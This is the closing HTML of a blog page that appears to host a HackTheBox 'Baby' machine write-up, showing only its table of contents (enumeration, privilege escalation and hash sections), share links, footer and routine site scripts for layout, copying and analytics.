        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Enum Info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-More-Info"><span class="toc-number">1.2.</span> <span class="toc-text">Enum More Info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Caroline-Robinson"><span class="toc-number">2.</span> <span class="toc-text">Shell As Caroline.Robinson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege-Privilege-Escalation"><span class="toc-number">2.1.</span> <span class="toc-text">SeBackupPrivilege Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Administrator"><span class="toc-number">3.</span> <span class="toc-text">Shell As Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/09/23/Baby/Baby/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&text=HackTheBox——HTB Baby Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&is_video=false&description=HackTheBox——HTB Baby Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Baby Writeup&body=Check out this article: https://n0nome.github.io/2025/09/23/Baby/Baby/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&title=HackTheBox——HTB Baby Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/09/23/Baby/Baby/&name=HackTheBox——HTB Baby Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/09/23/Baby/Baby/&t=HackTheBox——HTB Baby Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>
<script>
(function(){
  // 计算滚动条宽度
  function scrollbarWidth() {
    return window.innerWidth - document.documentElement.clientWidth;
  }

  function applyCompensation() {
    const w = scrollbarWidth();
    if (w > 0) {
      document.documentElement.style.paddingRight = w + 'px';
      document.body.style.paddingRight = w + 'px';
    }
  }

  function clearCompensation() {
    document.documentElement.style.paddingRight = '';
    document.body.style.paddingRight = '';
  }

  // MutationObserver：监测 Fancybox 容器加入/移除（通用且不依赖 Fancybox API 版本）
  const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      // 新增节点，若包含 Fancybox 容器则补偿
      for (const node of m.addedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          // slight delay to let browser apply overflow:hidden
          setTimeout(applyCompensation, 10);
        }
      }
      // 移除节点，若移除了 Fancybox 容器则清理补偿
      for (const node of m.removedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          clearCompensation();
        }
      }
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });

  // 额外：监听全局点击可能关闭 modal 的元素（保险）
  document.addEventListener('click', (e) => {
    if (e.target.closest('.fancybox__backdrop') || e.target.closest('.fancybox__button--close') || e.target.closest('[data-fancybox-close]')) {
      // 确保在关闭时清理
      setTimeout(clearCompensation, 10);
    }
  });

  // 当窗口大小改变时也清理（避免残留）
  window.addEventListener('resize', () => {
    if (document.querySelector('.fancybox__container') == null) clearCompensation();
  });

  // 可选：当页面加载时清理一次（预防样式残留）
  window.addEventListener('load', clearCompensation);
})();
</script>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

<!-- FancyBox -->

    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>


</body>
</html>
